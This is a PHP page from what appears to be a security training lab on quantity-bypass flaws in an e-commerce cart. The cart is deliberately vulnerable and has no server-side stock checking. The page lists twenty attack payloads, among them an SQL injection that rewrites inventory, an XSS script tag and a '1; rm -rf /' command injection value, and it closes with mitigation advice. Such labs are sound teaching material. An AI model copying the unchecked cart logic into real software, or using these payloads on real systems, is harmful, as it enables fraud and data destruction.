<?php
// Lab 2: Quantity Bypass
// Vulnerability: Quantity bypass vulnerabilities

session_start();

$message = '';
$cart = $_SESSION['cart'] ?? [];
$total = 0;
$inventory = [
    'ITEM001' => ['name' => 'Premium Product', 'price' => 99.99, 'stock' => 10],
    'ITEM002' => ['name' => 'Standard Product', 'price' => 49.99, 'stock' => 5],
    'ITEM003' => ['name' => 'Basic Product', 'price' => 19.99, 'stock' => 20]
];

// Simulate quantity bypass processing
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    if ($action === 'add_item') {
        $item_id = $_POST['item_id'] ?? '';
        $quantity = intval($_POST['quantity'] ?? 1);
        
        if (!empty($item_id) && isset($inventory[$item_id])) {
            $item = $inventory[$item_id];
            
            // Vulnerable: No proper stock checking
            if ($quantity > 0) {
                $cart[] = [
                    'id' => $item_id,
                    'name' => $item['name'],
                    'quantity' => $quantity,
                    'price' => $item['price'],
                    'total' => $item['price'] * $quantity
                ];
                $_SESSION['cart'] = $cart;
                $message = '<div class="alert alert-success">✅ Item added to cart successfully!</div>';
            } else {
                $message = '<div class="alert alert-danger">❌ Invalid quantity.</div>';
            }
        } else {
            $message = '<div class="alert alert-danger">❌ Invalid item ID.</div>';
        }
    } elseif ($action === 'update_quantity') {
        $item_index = intval($_POST['item_index'] ?? -1);
        $new_quantity = intval($_POST['new_quantity'] ?? 0);
        
        if ($item_index >= 0 && $item_index < count($cart) && $new_quantity > 0) {
            $cart[$item_index]['quantity'] = $new_quantity;
            $cart[$item_index]['total'] = $cart[$item_index]['price'] * $new_quantity;
            $_SESSION['cart'] = $cart;
            $message = '<div class="alert alert-success">✅ Quantity updated successfully!</div>';
        } else {
            $message = '<div class="alert alert-danger">❌ Invalid quantity update.</div>';
        }
    } elseif ($action === 'clear_cart') {
        $_SESSION['cart'] = [];
        $cart = [];
        $message = '<div class="alert alert-info">ℹ️ Cart cleared successfully!</div>';
    }
}

// Calculate total
foreach ($cart as $item) {
    $total += $item['total'];
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 2: Quantity Bypass - Business Logic Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .result-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .quantity-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .cart-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .cart-item {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border: 1px solid #334155;
        }

        .quantity-bypass-techniques {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .technique-card {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            border: 1px solid #334155;
        }

        .technique-title {
            color: var(--accent-green);
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .technique-demo {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .total-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
            text-align: center;
        }

        .total-amount {
            font-size: 2rem;
            font-weight: bold;
            color: var(--accent-green);
        }

        .inventory-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .inventory-item {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border: 1px solid #334155;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Business Logic Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 2: Quantity Bypass</h1>
            <p class="hero-subtitle">Quantity bypass vulnerabilities</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates quantity bypass vulnerabilities where attackers can exceed quantity limits, bypass stock restrictions, and manipulate inventory controls to gain unauthorized benefits.</p>
            <p><strong>Objective:</strong> Understand how quantity bypass attacks work and how to exploit them.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-cart me-2"></i>Vulnerable E-commerce System
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>Add Item to Cart</h5>
                            <p>This system allows adding items to cart. Try to bypass quantity limits:</p>
                            
                            <form method="POST">
                                <input type="hidden" name="action" value="add_item">
                                <div class="mb-3">
                                    <label for="item_id" class="form-label">Select Item</label>
                                    <select class="form-select" id="item_id" name="item_id" required>
                                        <option value="">Choose an item</option>
                                        <?php foreach ($inventory as $id => $item): ?>
                                        <option value="<?php echo $id; ?>"><?php echo $item['name']; ?> - $<?php echo $item['price']; ?> (Stock: <?php echo $item['stock']; ?>)</option>
                                        <?php endforeach; ?>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label for="quantity" class="form-label">Quantity</label>
                                    <input type="number" class="form-control" id="quantity" name="quantity" value="1" min="1" max="100" required>
                                </div>
                                <button type="submit" class="btn btn-primary">Add to Cart</button>
                            </form>
                            
                            <?php echo $message; ?>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-cart-plus me-2"></i>Quantity Bypass Tester
                    </div>
                    <div class="card-body">
                        <div class="quantity-warning">
                            <h5>⚠️ Quantity Bypass Warning</h5>
                            <p>This lab demonstrates quantity bypass vulnerabilities:</p>
                            <ul>
                                <li><code>No Stock Checking</code> - No proper inventory validation</li>
                                <li><code>Client-Side Limits</code> - Only client-side quantity limits</li>
                                <li><code>Parameter Tampering</code> - Quantity can be modified</li>
                                <li><code>No Authorization</code> - No quantity verification</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Bypass Techniques</h5>
                            <p>These techniques can be used for quantity bypass:</p>
                            <ul>
                                <li><code>Parameter Tampering</code> - Modify quantity parameters</li>
                                <li><code>Negative Quantities</code> - Use negative values</li>
                                <li><code>Large Quantities</code> - Exceed stock limits</li>
                                <li><code>Client-Side Bypass</code> - Disable client validation</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testQuantityBypass()" class="btn btn-primary">Test Quantity Bypass</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-box-seam me-2"></i>Inventory Status
                    </div>
                    <div class="card-body">
                        <div class="inventory-display">
                            <h5>Current Inventory:</h5>
                            <?php foreach ($inventory as $id => $item): ?>
                            <div class="inventory-item">
                                <div class="row align-items-center">
                                    <div class="col-md-4">
                                        <strong><?php echo $item['name']; ?></strong>
                                    </div>
                                    <div class="col-md-2">
                                        <span class="text-muted">Price: $<?php echo $item['price']; ?></span>
                                    </div>
                                    <div class="col-md-2">
                                        <span class="text-info">Stock: <?php echo $item['stock']; ?></span>
                                    </div>
                                    <div class="col-md-4">
                                        <span class="text-warning">ID: <?php echo $id; ?></span>
                                    </div>
                                </div>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <?php if (!empty($cart)): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-cart-check me-2"></i>Shopping Cart
                    </div>
                    <div class="card-body">
                        <div class="cart-display">
                            <?php foreach ($cart as $index => $item): ?>
                            <div class="cart-item">
                                <div class="row align-items-center">
                                    <div class="col-md-3">
                                        <strong><?php echo htmlspecialchars($item['name']); ?></strong>
                                    </div>
                                    <div class="col-md-2">
                                        <span class="text-muted">Qty: <?php echo $item['quantity']; ?></span>
                                    </div>
                                    <div class="col-md-2">
                                        <span class="text-muted">Price: $<?php echo number_format($item['price'], 2); ?></span>
                                    </div>
                                    <div class="col-md-2">
                                        <span class="text-success">Total: $<?php echo number_format($item['total'], 2); ?></span>
                                    </div>
                                    <div class="col-md-3">
                                        <form method="POST" class="d-inline">
                                            <input type="hidden" name="action" value="update_quantity">
                                            <input type="hidden" name="item_index" value="<?php echo $index; ?>">
                                            <div class="input-group">
                                                <input type="number" class="form-control form-control-sm" name="new_quantity" placeholder="New Qty" min="1">
                                                <button type="submit" class="btn btn-sm btn-outline-primary">Update</button>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            <?php endforeach; ?>
                        </div>
                        
                        <div class="total-display">
                            <h5>Cart Total</h5>
                            <div class="total-amount">$<?php echo number_format($total, 2); ?></div>
                        </div>
                        
                        <div class="mt-3">
                            <form method="POST" class="d-inline">
                                <input type="hidden" name="action" value="clear_cart">
                                <button type="submit" class="btn btn-outline-danger">Clear Cart</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Quantity Bypass Techniques
                    </div>
                    <div class="card-body">
                        <div class="quantity-bypass-techniques">
                            <div class="technique-card">
                                <div class="technique-title">Parameter Tampering</div>
                                <div class="technique-demo">// Modify quantity in POST request
{
  "item_id": "ITEM001",
  "quantity": 1000  // Exceed stock limit
}</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Negative Quantities</div>
                                <div class="technique-demo">// Use negative quantities
{
  "item_id": "ITEM001",
  "quantity": -10  // Negative quantity
}</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Large Quantities</div>
                                <div class="technique-demo">// Use very large quantities
{
  "item_id": "ITEM001",
  "quantity": 999999  // Very large number
}</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Client-Side Bypass</div>
                                <div class="technique-demo">// Disable client validation
document.getElementById('quantity').disabled = false;
document.getElementById('quantity').value = '1000';
// Or modify form action
form.action = '/bypass_quantity_validation';</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Decimal Quantities</div>
                                <div class="technique-demo">// Use decimal quantities
{
  "item_id": "ITEM001",
  "quantity": 0.5  // Decimal quantity
}</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">String Quantities</div>
                                <div class="technique-demo">// Use string quantities
{
  "item_id": "ITEM001",
  "quantity": "1000"  // String instead of number
}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Quantity Bypass</li>
                        <li><strong>Severity:</strong> Medium</li>
                        <li><strong>Method:</strong> Parameter tampering</li>
                        <li><strong>Issue:</strong> No proper stock checking</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Parameter Tampering:</strong> Modify quantity parameters</li>
                        <li><strong>Negative Quantities:</strong> Use negative values</li>
                        <li><strong>Large Quantities:</strong> Exceed stock limits</li>
                        <li><strong>Client-Side Bypass:</strong> Disable client validation</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Quantity Bypass Examples</h5>
            <p>Use these techniques to exploit quantity bypass vulnerabilities:</p>
            
            <h6>1. Basic Quantity Bypass:</h6>
            <div class="code-block">// Original request
POST /add_to_cart
{
  "item_id": "ITEM001",
  "quantity": 1
}

// Bypassed request
POST /add_to_cart
{
  "item_id": "ITEM001",
  "quantity": 1000  // Exceed stock limit
}</div>

            <h6>2. Negative Quantity Attack:</h6>
            <div class="code-block">// Use negative quantities
{
  "item_id": "ITEM001",
  "quantity": -10
}

// This could result in inventory increase</div>

            <h6>3. Large Quantity Attack:</h6>
            <div class="code-block">// Use very large quantities
{
  "item_id": "ITEM001",
  "quantity": 999999
}

// Exceed maximum integer limits</div>

            <h6>4. Decimal Quantity Attack:</h6>
            <div class="code-block">// Use decimal quantities
{
  "item_id": "ITEM001",
  "quantity": 0.5
}

// Fractional quantities</div>

            <h6>5. String Quantity Attack:</h6>
            <div class="code-block">// Use string quantities
{
  "item_id": "ITEM001",
  "quantity": "1000"
}

// String instead of number</div>

            <h6>6. Array Quantity Attack:</h6>
            <div class="code-block">// Use array quantities
{
  "item_id": "ITEM001",
  "quantity": [1000]
}

// Array instead of number</div>

            <h6>7. Object Quantity Attack:</h6>
            <div class="code-block">// Use object quantities
{
  "item_id": "ITEM001",
  "quantity": {"value": 1000}
}

// Object instead of number</div>

            <h6>8. Boolean Quantity Attack:</h6>
            <div class="code-block">// Use boolean quantities
{
  "item_id": "ITEM001",
  "quantity": true
}

// Boolean instead of number</div>

            <h6>9. Null Quantity Attack:</h6>
            <div class="code-block">// Use null quantities
{
  "item_id": "ITEM001",
  "quantity": null
}

// Null instead of number</div>

            <h6>10. Undefined Quantity Attack:</h6>
            <div class="code-block">// Use undefined quantities
{
  "item_id": "ITEM001",
  "quantity": undefined
}

// Undefined instead of number</div>

            <h6>11. Infinity Quantity Attack:</h6>
            <div class="code-block">// Use infinity quantities
{
  "item_id": "ITEM001",
  "quantity": Infinity
}

// Infinity instead of number</div>

            <h6>12. NaN Quantity Attack:</h6>
            <div class="code-block">// Use NaN quantities
{
  "item_id": "ITEM001",
  "quantity": NaN
}

// NaN instead of number</div>

            <h6>13. Scientific Notation Attack:</h6>
            <div class="code-block">// Use scientific notation
{
  "item_id": "ITEM001",
  "quantity": 1e6
}

// Scientific notation for large numbers</div>

            <h6>14. Hexadecimal Quantity Attack:</h6>
            <div class="code-block">// Use hexadecimal quantities
{
  "item_id": "ITEM001",
  "quantity": 0x3E8
}

// Hexadecimal representation</div>

            <h6>15. Octal Quantity Attack:</h6>
            <div class="code-block">// Use octal quantities
{
  "item_id": "ITEM001",
  "quantity": 01000
}

// Octal representation</div>

            <h6>16. Binary Quantity Attack:</h6>
            <div class="code-block">// Use binary quantities
{
  "item_id": "ITEM001",
  "quantity": 0b1111101000
}

// Binary representation</div>

            <h6>17. Unicode Quantity Attack:</h6>
            <div class="code-block">// Use unicode quantities
{
  "item_id": "ITEM001",
  "quantity": "१०००"
}

// Unicode number representation</div>

            <h6>18. SQL Injection via Quantity:</h6>
            <div class="code-block">// SQL injection in quantity
{
  "item_id": "ITEM001",
  "quantity": "1; UPDATE inventory SET stock = 999999 WHERE id = 'ITEM001'; --"
}

// SQL injection to modify inventory</div>

            <h6>19. XSS via Quantity:</h6>
            <div class="code-block">// XSS in quantity
{
  "item_id": "ITEM001",
  "quantity": "<script>alert('XSS')</script>"
}

// XSS payload in quantity</div>

            <h6>20. Command Injection via Quantity:</h6>
            <div class="code-block">// Command injection in quantity
{
  "item_id": "ITEM001",
  "quantity": "1; rm -rf /"
}

// Command injection payload</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Inventory manipulation and stock issues</li>
                <li>Financial losses and revenue impact</li>
                <li>Unauthorized access and privilege escalation</li>
                <li>Compliance violations and legal issues</li>
                <li>Data manipulation and integrity issues</li>
                <li>Business process disruption and operational impact</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement server-side quantity validation</li>
                    <li>Use proper stock checking and inventory management</li>
                    <li>Implement proper authorization checks</li>
                    <li>Use secure coding practices</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual quantity patterns</li>
                    <li>Implement proper input validation</li>
                    <li>Use secure session management</li>
                    <li>Implement proper error handling</li>
                    <li>Educate users about security threats</li>
                    <li>Use multi-factor authentication</li>
                    <li>Implement proper logging and monitoring</li>
                    <li>Use quantity verification systems</li>
                    <li>Implement proper audit trails</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testQuantityBypass() {
            alert('Quantity Bypass test initiated. Try the bypass techniques above.');
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
